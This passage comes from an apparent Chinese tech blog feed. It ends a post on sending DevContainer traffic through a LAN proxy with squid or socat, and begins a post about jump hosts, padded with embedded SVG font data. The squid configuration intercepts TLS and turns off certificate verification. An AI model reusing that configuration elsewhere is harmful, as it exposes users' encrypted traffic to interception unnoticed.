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)}.d2-1236139595 .text-mono-bold{font-family:'d2-1236139595-font-mono-bold'}@font-face{font-family:d2-1236139595-font-mono-bold;src:url(data:application/font-woff;base64,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)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-1236139595 .fill-N1{fill:#000410}.d2-1236139595 .fill-B6{fill:#fff}.d2-1236139595 .stroke-B1{stroke:#000410}.dots-overlay{fill:url(#dots);mix-blend-mode:multiply}</style><defs><pattern id="dots" width="15" height="15" x="0" y="0" patternUnits="userSpaceOnUse"><path fill="#0A0F25" d="M2 2h1v1H2zM12 2h1v1h-1zM12 12h1v1h-1zM2 12h1v1H2zM2 7h1v1H2zM12 7h1v1h-1zM7 2h1v1H7zM7 12h1v1H7zM7 7h1v1H7z" opacity=".1" style="mix-blend-mode:multiply"/></pattern></defs><g id="local"><g class="shape"><path fill="#FFF" stroke="#000410" d="M0 155h92v66H0z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="46" y="193.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">LOCAL</text></g><g id="remote"><g class="shape"><path stroke="#000410" d="M232 76h516v213H232z" class="stroke-B1" style="fill:#e7e9ee;stroke-width:2"/><path d="M232 76h516v213H232z" class="dots-overlay" style="stroke-width:2"/><path fill="transparent" stroke="#000410" d="M237 81h506v203H237z" class="stroke-B1" style="stroke-width:2"/></g><text x="490" y="63" fill="#000410" class="text-mono fill-N1" style="text-anchor:middle;font-size:28px">REMOTE SERVER</text></g><g id="proxy"><g class="shape"><path fill="#FFF" stroke="#000410" d="M888 147h170v82H888z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="973" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="973" dy="0">HTTP://192.16</tspan><tspan x="973" dy="18.5">8.9.100:11451</tspan></text></g><g id="remote.docker"><g class="shape"><path stroke="#000410" d="M262 117h456v142H262z" class="stroke-B1" style="fill:#f5f6f9;stroke-width:2"/><path d="M262 117h456v142H262z" class="dots-overlay" style="stroke-width:2"/></g><text x="490" y="105" fill="#000410" class="text-mono fill-N1" style="text-anchor:middle;font-size:24px">DOCKER</text></g><g id="remote.docker.code"><g class="shape"><path fill="#FFF" stroke="#000410" d="M292 147h148v82H292z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="366" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="366" dy="0">VS CODE</tspan><tspan x="366" dy="18.5">(CONTAINER)</tspan></text></g><g id="remote.docker.proxy2"><g class="shape"><path fill="#FFF" stroke="#000410" d="M540 147h148v82H540z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="614" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="614" dy="0">HTTP://127.</tspan><tspan x="614" dy="18.5">0.0.1:1081</tspan></text></g><g id="(local -&gt; remote.docker.code)[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#000410"/></marker><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M94 188h194" class="connection stroke-B1" mask="url(#d2-1236139595)" style="stroke-width:2"/></g><path id="remote.docker.(code -&gt; proxy2)[0]" fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M442 188h94" class="connection stroke-B1" mask="url(#d2-1236139595)" style="stroke-width:2"/><path id="(remote.docker.proxy2 -&gt; proxy)[0]" fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M690 188h194" class="connection stroke-B1" mask="url(#d2-1236139595)" style="stroke-width:2"/><mask id="d2-1236139595" width="1060" height="255" x="-1" y="35" maskUnits="userSpaceOnUse"><path fill="#fff" d="M-1 35h1060v255H-1z"/><path fill="rgba(0,0,0,0.75)" d="M22.5 177.5h47v21h-47zM382 35h216v36H382zM910.5 169.5h125v37h-125zM447.5 81h85v31h-85zM314.5 169.5h103v37h-103zM562.5 169.5h103v37h-103z"/></mask></svg></svg></figure><h2 id="尝试二：在-devcontainer-内部架设转发代理"><del>尝试二：在 DevContainer 内部架设转发代理</del></h2><blockquote><p ><strong>该方法后来被证明不是完全有效，因为 squid 会在请求转发前作 DNS 查询，且该行为似乎无法关闭。若遇上被墙的域名，squid 在 DNS 失败后会直接返回 503。正确解法见尝试三。</strong></p></blockquote><p ><del>我们选择 <a href="https://www.squid-cache.org/">squid</a> 作为 DevContainer 内部的转发代理。</del></p><h3 id="安装-squid">安装 squid</h3><p >首先在 <code>Dockerfile</code> 中安装 squid，并写入配置文件：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># 假设基础镜像为 ubuntu / debian</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y squid</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;http_port 127.0.0.1:1082\ncache_peer 192.168.9.100 parent 11451 0 no-query proxy-only tls-flags=DONT_VERIFY_PEER\ncache deny all\nssl_bump peek all\nssl_bump bump all\nsslproxy_cert_error allow all\ntls_outgoing_options flags=DONT_VERIFY_PEER&#x27;</span> &gt;&gt; /etc/squid/squid.conf</span></span><br></pre></div></div><p >第二行的配置文件内容如下：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">http_port 127.0.0.1:1081</span><br><span class="line">cache_peer 192.168.9.100 parent 11451 0 no-query proxy-only tls-flags=DONT_VERIFY_PEER</span><br><span class="line">cache deny all</span><br><span class="line"></span><br><span class="line">ssl_bump peek all</span><br><span class="line">ssl_bump bump all</span><br><span class="line">sslproxy_cert_error allow all</span><br><span class="line">tls_outgoing_options flags=DONT_VERIFY_PEER</span><br></pre></div></div><p >其中前两行配置了 squid 的监听端口和上级代理。后面的 <code>ssl_*</code> 部分则开启了 <a href="https://wiki.squid-cache.org/Features/SslBump">SSL Bump</a> 功能——<strong>这是必要的</strong>，否则 HTTPS 请求经由 squid 时会报 503 直接拒绝，困扰了我许久。</p><h3 id="设置-squid-自启动">设置 squid 自启动</h3><p >为了使 squid 服务在容器启动时自动启动，我们需要在 <code>devcontainer.json</code> 中添加如下配置：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-punctuation">{</span></span><br><span class="line">  <span class="hljs-comment">// ...</span></span><br><span class="line">  <span class="hljs-attr">&quot;postStartCommand&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;service squid restart&quot;</span></span><br><span class="line"><span class="hljs-punctuation">}</span></span><br></pre></div></div><h2 id="尝试三：在-devcontainer-内使用-socat-转发代理">尝试三：在 DevContainer 内使用 socat 转发代理</h2><p >这种方法的的出发点与 squid 类似，但是过程更简单，只需起一个 <code>socat</code> 进程作为 TCP 转发的中介即可。</p><h3 id="安装-socat">安装 socat</h3><p >首先在 <code>Dockerfile</code> 中安装 socat：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># 假设基础镜像为 ubuntu / debian</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y socat</span></span><br></pre></div></div><p >与尝试二相比，甚至不需要写入配置文件。</p><h3 id="设置-socat-进程自启动">设置 socat 进程自启动</h3><p >我们需要在 <code>devcontainer.json</code> 中添加如下配置：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-punctuation">{</span></span><br><span class="line">  <span class="hljs-comment">// ...</span></span><br><span class="line">  <span class="hljs-attr">&quot;postStartCommand&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;nohup bash -c &#x27;socat -d TCP-LISTEN:1081,fork TCP:192.168.9.100:11451 &gt; /tmp/proxy.log &amp;&#x27;&quot;</span></span><br><span class="line"><span class="hljs-punctuation">}</span></span><br></pre></div></div><p >读者可根据实际情况更改监听端口以及上游地址。</p><p >如此一来，即使在 DevContainer 内也可以经由 <code>http://127.0.0.1:1081</code> 地址访问代理，与本地环境保持一致。Copilot 等工具也可以正常使用了。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Docker/">Docker</category>
      
      <category domain="https://i.hsfzxjy.site/tags/VS-Code/">VS Code</category>
      
      <category domain="https://i.hsfzxjy.site/tags/DevContainer/">DevContainer</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Proxy/">Proxy</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Squid/">Squid</category>
      
      
      <comments>https://i.hsfzxjy.site/configure-http-proxy-in-devcontainer/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>如何在跳板机背后的服务器上使用 VS Code Remote - Containers</title>
      <link>https://i.hsfzxjy.site/devcontainers-behind-jump-proxy/</link>
      <guid>https://i.hsfzxjy.site/devcontainers-behind-jump-proxy/</guid>
      <pubDate>Mon, 20 Jan 2025 14:27:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;假设有如下网络拓扑：&lt;/p&gt;
&lt;figure class=&quot;d2&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;452&quot; height=&quot;59&quot; preserveAspectRatio=&quot;xMinYMin meet&quot; vi</description>
        
      
      
      
      <content:encoded><![CDATA[<p >假设有如下网络拓扑：</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="452" height="59" preserveAspectRatio="xMinYMin meet" viewBox="0 0 645 84"><svg id="d2-svg" width="645" height="84" class="d2-176717286" viewBox="-1 -1 645 84"><rect width="645" height="84" x="-1" y="-1" stroke-width="0" rx="0" style="fill:#fff"/><style>@font-face{font-family:d2-176717286-font-mono;src:url(data:application/font-woff;base64,d09GRgABAAAAAA3kAAoAAAAAGKQAAgm6AAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAAA9AAAAGAAAABgld/X+GNtYXAAAAFUAAAAewAAAKACBALBZ2x5ZgAAAdAAAARNAAAFHCpJbNBoZWFkAAAGIAAAADYAAAA2GanOOmhoZWEAAAZYAAAAJAAAACQGMwCZaG10eAAABnwAAABIAAAASCowBZpsb2NhAAAGxAAAACYAAAAmDE4LTG1heHAAAAbsAAAAIAAAACAARgJhbmFtZQAABwwAAAa4AAAQztydAx9wb3N0AAANxAAAACAAAAAg/7gAMwADAlgBkAAFAAACigJYAAAASwKKAlgAAAFeADIBIwAAAgsFCQMEAwICBCAAAvcCADgDAAAAAAAAAABBREJPAEAAIP//Au7/BgAAA9gBEWAAAZ8AAAAAAeYClAAAACAAA3icbMxBygEBGIDhZ/6Zn8Fg7CydQHIDyUZKETmYqyCx4CJKDvLJLKy826deJFIJCpk9+kqp3MDQ2NTM3MLS2tYugkpGJl9Z2XwknvGKR9zjFte4xDlOcYxD9f5doqejq/QnlflXU5draGoptHkDAAD//wEAAP//IrUeswB4nFSTXWzTVh/G/+ckdV5e0hI3TUIgrZs4sVtwMM3xR5PSpPmgoaShTUY2oG2gpKUstBuKBmh8jaHBRMU0T0J8TAzEFZUmIXHFtovtBk1cTOzjYtK0cbMLhIRAu8glcSa7ZaKybB9Z8jnP83v+D7RAHABvwFfAAmvADu3gAiC0nw75eZ612VTeQ1SVZTAdR3/pGkIjklU5du7c19a+1PPU9Ef4SmM+9snc3PjTZ9+WT5z47Cl6DBi6AXA/1mAN0ABOG+E5jmcpyuIkTpZnbc+YhwztX2d1dP/xpPxkT/xlAr0/M6MuRKML+j6sNY4+egQAYIEKAGaxBg7wQsDQRSJut6uDsrnMF2shEUWWOJalXy8q36Vno/0DO8YvvXd87+6R/OhUdffUxNtVrHUPx/rG1lnX7spM70enFVUWGq8G0oMyAIJks4434ZvQCdAS4DhZUhQScXtsHMcGKMrV4XaTiKJ6KArtL3w8OnqhNDDpE72p3sSUJE0lwjsYka/YC9ePVK8Xt3bLG/3J48XihymOJeEIGPvXAHA71mCtydb1+qqhq/r3yKH/g0axNvw4+zILCArNOnqBv4B2UwuvmmfLtF/20x0UhTrUakDy5bhsUn+BDvWW7XI/ETbnCqg2rCcHZ7eZ510EwJ1YgxaTGe13XSyi7VhrPMgaXDFsbdZxD74J62DjKscGVIpfRhkwfCNhZ21oqLZz+ZmbmMjlJibsxRvz1Wvj49eq8zeKI9rZ05cvnz6rGfvOAOBerEEbeN5My8laWPq/iGZ+Ss8NjKfv7r91bCFfKOQXsMYWMqNTtP43cunP0d7EUFIC00e6WcdefBPCq1hIHMfzW/DqlIyQPJ4ubDhAfTtOCpFQpT+TY+RA2Z8U1OlE/HBQ6N5FosOs4pvsTfL9h+2yEAuFY1vYTb623tZNqa2RsXA4qHT6JYHp2WDvcYSTfVIpAgjGmnW8BmtG